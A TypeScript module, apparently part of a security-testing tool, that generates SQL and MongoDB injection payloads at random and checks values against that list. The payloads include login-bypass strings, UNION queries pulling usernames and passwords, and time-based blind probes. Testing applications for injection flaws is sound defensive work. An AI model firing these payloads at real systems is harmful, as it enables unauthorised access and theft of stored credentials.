/**
 * SQL/NoSQL Injection Strategy
 * 
 * Generates injection payloads for SQL and NoSQL databases.
 * Tests for: SQL injection, MongoDB operator injection, authentication bypass.
 */

import { scenarioRandom } from '../../seededRandom.js';

export interface SqlNoSqlPayload {
  type: 'SQL_CLASSIC' | 'SQL_UNION' | 'SQL_BOOLEAN' | 'NOSQL_OPERATOR' | 'NOSQL_AUTH_BYPASS';
  vector: string;
  description: string;
}

/**
 * Classic SQL injection payloads
 */
const SQL_CLASSIC_VECTORS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "' OR 1=1--",
  "' OR 1=1/*",
  "admin'--",
  "admin' #",
  "admin'/*",
  "'or'1'='1",
  "1' OR '1'='1",
  "' OR ''='",
  "' OR 'a'='a",
];

/**
 * SQL UNION-based injection vectors
 */
const SQL_UNION_VECTORS = [
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL,NULL--",
  "' UNION ALL SELECT NULL--",
  "' UNION SELECT version()--",
  "' UNION SELECT table_name FROM information_schema.tables--",
  "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
  "' UNION SELECT NULL,NULL,NULL FROM dual WHERE 'a'='a",
  "' UNION SELECT 'a","' UNION SELECT username,password FROM users--",
];

/**
 * Boolean-based blind SQL injection
 */
const SQL_BOOLEAN_VECTORS = [
  "' AND 1=1--",
  "' AND 1=2--",
  "' AND 'a'='a",
  "' AND 'a'='b",
  "' AND (SELECT COUNT(*) FROM users)>0--",
  "' AND (SELECT COUNT(*) FROM users)>1--",
  "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
  "' AND SLEEP(5)--",
  "1' AND SLEEP(5)--",
  "' WAITFOR DELAY '00:00:05'--",
];

/**
 * NoSQL (MongoDB) operator injection vectors
 */
const NOSQL_OPERATOR_VECTORS = [
  '{"$gt": ""}',
  '{"$gt": 0}',
  '{"$gte": 0}',
  '{"$ne": ""}',
  '{"$ne": null}',
  '{"$lt": 999999}',
  '{"$lte": 999999}',
  '{"$exists": true}',
  '{"$exists": false}',
  '{"$type": 2}',
  '{"$regex": ".*"}',
  '{"$regex": "^admin"}',
  '{"$options": "i"}',
  '{"$or": [{"a": "1"}]}',
  '{"$and": [{"a": "1"}]}',
  '{"$nor": [{"a": "1"}]}',
  '{"$all": ["admin"]}',
  '{"$in": ["admin", "root"]}',
  '{"$nin": ["admin"]}',
];

/**
 * NoSQL authentication bypass vectors
 */
const NOSQL_AUTH_BYPASS_VECTORS = [
  '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
  '{"username": {"$ne": null}, "password": {"$ne": null}}',
  '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
  '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
  '{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}',
  '{"$where": "this.username == this.password"}',
  '{"$where": "return true"}',
  '{"$or": [{"username": "admin"}, {"username": "admin"}]}',
  'username[$ne]=&password[$ne]=',
  'username[$gt]=&password[$gt]=',
  'username[$regex]=^adm&password[$regex]=^',
];

/**
 * Generates a SQL/NoSQL injection payload.
 * @returns A SqlNoSqlPayload with injection vector
 */
export function generateSqlNoSqlPayload(): SqlNoSqlPayload {
  const rand = scenarioRandom();
  let payload: SqlNoSqlPayload;

  if (rand < 0.2) {
    const vector = SQL_CLASSIC_VECTORS[Math.floor(scenarioRandom() * SQL_CLASSIC_VECTORS.length)];
    payload = { type: 'SQL_CLASSIC', vector, description: 'Classic SQL injection' };
  } else if (rand < 0.4) {
    const vector = SQL_UNION_VECTORS[Math.floor(scenarioRandom() * SQL_UNION_VECTORS.length)];
    payload = { type: 'SQL_UNION', vector, description: 'SQL UNION injection' };
  } else if (rand < 0.55) {
    const vector = SQL_BOOLEAN_VECTORS[Math.floor(scenarioRandom() * SQL_BOOLEAN_VECTORS.length)];
    payload = { type: 'SQL_BOOLEAN', vector, description: 'Boolean-based SQL injection' };
  } else if (rand < 0.75) {
    const vector = NOSQL_OPERATOR_VECTORS[Math.floor(scenarioRandom() * NOSQL_OPERATOR_VECTORS.length)];
    payload = { type: 'NOSQL_OPERATOR', vector, description: 'NoSQL operator injection' };
  } else {
    const vector = NOSQL_AUTH_BYPASS_VECTORS[Math.floor(scenarioRandom() * NOSQL_AUTH_BYPASS_VECTORS.length)];
    payload = { type: 'NOSQL_AUTH_BYPASS', vector, description: 'NoSQL auth bypass' };
  }

  return payload;
}

/**
 * Gets all SQL/NoSQL injection vectors as an array.
 * @returns Array of injection vectors
 */
export function getAllSqlNoSqlVectors(): string[] {
  return [
    ...SQL_CLASSIC_VECTORS,
    ...SQL_UNION_VECTORS,
    ...SQL_BOOLEAN_VECTORS,
    ...NOSQL_OPERATOR_VECTORS,
    ...NOSQL_AUTH_BYPASS_VECTORS,
  ];
}

/**
 * Checks if a string value is a known SQL/NoSQL injection vector.
 * @param value The value to check
 * @returns true if value is a known injection vector
 */
export function isSqlNoSqlVector(value: string): boolean {
  return getAllSqlNoSqlVectors().includes(value);
}

export default generateSqlNoSqlPayload;
